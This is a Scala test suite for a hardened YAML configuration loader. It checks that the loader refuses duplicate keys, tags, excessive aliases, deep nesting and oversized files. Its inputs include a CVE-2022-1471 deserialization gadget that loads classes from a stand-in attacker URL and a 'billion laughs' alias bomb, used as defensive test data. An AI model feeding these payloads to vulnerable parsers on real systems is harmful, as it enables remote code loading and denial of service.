package lakehouse.ingestion.core.config

import io.circe.Json
import lakehouse.ingestion.core.config.SafeYaml.Refusal._
import lakehouse.ingestion.core.config.SafeYaml.{Limits, Position}
import org.scalatest.EitherValues
import org.scalatest.funsuite.AnyFunSuite
import org.scalatest.matchers.should.Matchers

/**
 * What the loader of configuration accepts and what it refuses (ADR-0013 §5). Each refusal is
 * tried with the document that the control exists for.
 */
final class SafeYamlSpec extends AnyFunSuite with Matchers with EitherValues {

  private def obj(fields: (String, Json)*): Json = Json.obj(fields: _*)
  private def str(value: String): Json = Json.fromString(value)

  test("a document becomes the JSON it says: mappings, sequences, numbers, booleans and nulls") {
    val text =
      """# a source, as the discovery has it
        |id: sales.orders
        |enabled: true
        |connector:
        |  type: jdbc
        |  connection: { url: "jdbc:postgresql://postgres:5432/sales", user: ingest_ro }
        |keys: [order_id]
        |quality: { max_rejected_ratio: 0.01 }
        |retries: 3
        |owner: null
        |note:
        |""".stripMargin

    SafeYaml.parse(text).value shouldBe obj(
      "id" -> str("sales.orders"),
      "enabled" -> Json.True,
      "connector" -> obj(
        "type" -> str("jdbc"),
        "connection" -> obj(
          "url" -> str("jdbc:postgresql://postgres:5432/sales"),
          "user" -> str("ingest_ro")
        )
      ),
      "keys" -> Json.arr(str("order_id")),
      "quality" -> obj("max_rejected_ratio" -> Json.fromDoubleOrNull(0.01)),
      "retries" -> Json.fromInt(3),
      "owner" -> Json.Null,
      "note" -> Json.Null
    )
  }

  test("YAML 1.2: yes, no, on and off are strings, and only true and false are booleans") {
    // The JSON schema of YAML 1.2, which is the loader's: nothing is a boolean or a null but
    // the words JSON has for them. `True` and `~` are strings, and a decoder that expects a
    // boolean or nothing then says so.
    val text =
      """a: yes
        |b: no
        |c: on
        |d: off
        |e: NO
        |f: y
        |g: true
        |h: false
        |i: True
        |j: ~
        |k: Null
        |""".stripMargin

    SafeYaml.parse(text).value shouldBe obj(
      "a" -> str("yes"),
      "b" -> str("no"),
      "c" -> str("on"),
      "d" -> str("off"),
      "e" -> str("NO"),
      "f" -> str("y"),
      "g" -> Json.True,
      "h" -> Json.False,
      "i" -> str("True"),
      "j" -> str("~"),
      "k" -> str("Null")
    )
  }

  test("a key twice in one mapping is refused, at any depth, with its place") {
    SafeYaml.parse("id: a\nmode: full\nid: b\n").left.value shouldBe
      DuplicateKey("id", Some(Position(3, 1)))

    val nested =
      """load:
        |  watermark: { column: updated_at, column: created_at }
        |""".stripMargin
    SafeYaml.parse(nested).left.value shouldBe DuplicateKey("column", Some(Position(2, 36)))
  }

  test("the same key in two mappings is no duplicate") {
    val text =
      """bronze: { table: bronze/sales/orders }
        |silver: { table: silver/sales/orders }
        |list:
        |  - table: a
        |  - table: b
        |""".stripMargin

    SafeYaml.parse(text).isRight shouldBe true
  }

  test("a tag is refused, whatever it is: the one that built a class in SnakeYAML too") {
    // The document of CVE-2022-1471: with SnakeYAML's default constructor it loaded a class.
    val gadget =
      """!!javax.script.ScriptEngineManager [
        |  !!java.net.URLClassLoader [[ !!java.net.URL ["http://attacker.example/"] ]]
        |]
        |""".stripMargin
    SafeYaml.parse(gadget).left.value shouldBe a[TagNotAllowed]

    SafeYaml.parse("retries: !!str 3\n").left.value shouldBe
      TagNotAllowed("tag:yaml.org,2002:str", Some(Position(1, 10)))
    // circe-yaml would have made this the object {"secret": "value"}.
    SafeYaml.parse("password: !secret value\n").left.value shouldBe
      TagNotAllowed("!secret", Some(Position(1, 11)))
    SafeYaml.parse("keys: !!set { a, b }\n").left.value shouldBe a[TagNotAllowed]
  }

  test("more aliases than the limit are refused: the billion laughs") {
    val laughs =
      """a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
        |b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
        |c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
        |d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
        |e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
        |f: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]
        |g: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f]
        |h: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g]
        |i: &i [*h, *h, *h, *h, *h, *h, *h, *h, *h]
        |""".stripMargin

    // The ninth alias of the second line.
    SafeYaml.parse(laughs).left.value shouldBe
      TooManyAliases(Limits.Default.maxAliases, Some(Position(2, 40)))
  }

  test("a few aliases are read, each as the value it stands for") {
    val text =
      """defaults: &defaults { on_new_column: add, on_type_change: fail }
        |orders: *defaults
        |customers: *defaults
        |""".stripMargin
    val defaults = obj("on_new_column" -> str("add"), "on_type_change" -> str("fail"))

    SafeYaml.parse(text).value shouldBe
      obj("defaults" -> defaults, "orders" -> defaults, "customers" -> defaults)
  }

  test("a merge key is a key like any other: YAML 1.2 has no merge") {
    val text =
      """base: &base { on_new_column: add }
        |orders:
        |  <<: *base
        |  on_type_change: fail
        |""".stripMargin
    val base = obj("on_new_column" -> str("add"))

    // A decoder that knows its fields then refuses `<<` as one it does not know.
    SafeYaml.parse(text).value shouldBe
      obj("base" -> base, "orders" -> obj("<<" -> base, "on_type_change" -> str("fail")))
  }

  test("nesting beyond the limit is refused, and a hundred thousand levels overflow no stack") {
    val limit = Limits.Default.maxDepth
    def nested(depth: Int): String = ("[" * depth) + ("]" * depth)

    SafeYaml.parse(nested(limit)).isRight shouldBe true
    SafeYaml.parse(nested(limit + 1)).left.value shouldBe
      TooDeep(limit, Some(Position(1, limit + 1)))
    // The loader alone ends here in a StackOverflowError, which is no error of the document.
    SafeYaml.parse(nested(100000)).left.value shouldBe a[TooDeep]
    SafeYaml.parse("- " * 50000 + "x").left.value shouldBe a[TooDeep]
    SafeYaml.parse("{a: " * 50000).left.value shouldBe a[TooDeep]
  }

  test("a document over the size limit is refused before it is read") {
    val limits = Limits(maxCodePoints = 64, maxDepth = 8, maxAliases = 0)
    val text = "key: " + ("x" * 60)

    SafeYaml.parse(text, limits).left.value shouldBe TooLarge(65, 64)
    SafeYaml.parse(text.dropRight(1), limits).isRight shouldBe true
    // Characters, not bytes or UTF-16 units: an emoji is one.
    SafeYaml.parse("k: " + ("😀" * 61), limits).isRight shouldBe true
  }

  test("a file must hold one document: not none, and not two") {
    SafeYaml.parse("").left.value shouldBe NotOneDocument(0)
    SafeYaml.parse("# only a comment\n").left.value shouldBe NotOneDocument(0)
    SafeYaml.parse("id: a\n---\nid: b\n").left.value shouldBe NotOneDocument(2)
  }

  test("a key must be a plain value: not a collection, and not an alias") {
    SafeYaml.parse("? [a, b]\n: c\n").left.value shouldBe KeyNotScalar(Some(Position(1, 3)))
    SafeYaml.parse("{ {a: b}: c }\n").left.value shouldBe a[KeyNotScalar]
    SafeYaml.parse("a: &k key\n*k : value\n").left.value shouldBe a[KeyNotScalar]
  }

  test("text that is not YAML is refused with the place of the problem") {
    val refusal = SafeYaml.parse("keys: [order_id, customer_id\nmode: full\n").left.value

    refusal shouldBe a[Malformed]
    refusal.at.map(_.line) shouldBe Some(2)
    refusal.message should include("line 2")
  }

  test("a refusal says what is wrong and where") {
    DuplicateKey("id", Some(Position(3, 1))).message shouldBe
      "the key 'id' appears twice in one mapping (line 3, column 1)"
    NotOneDocument(2).message shouldBe "the file has 2 documents, and must have one"
    TooLarge(65, 64).message shouldBe "the document has 65 characters, and the limit is 64"
  }
}
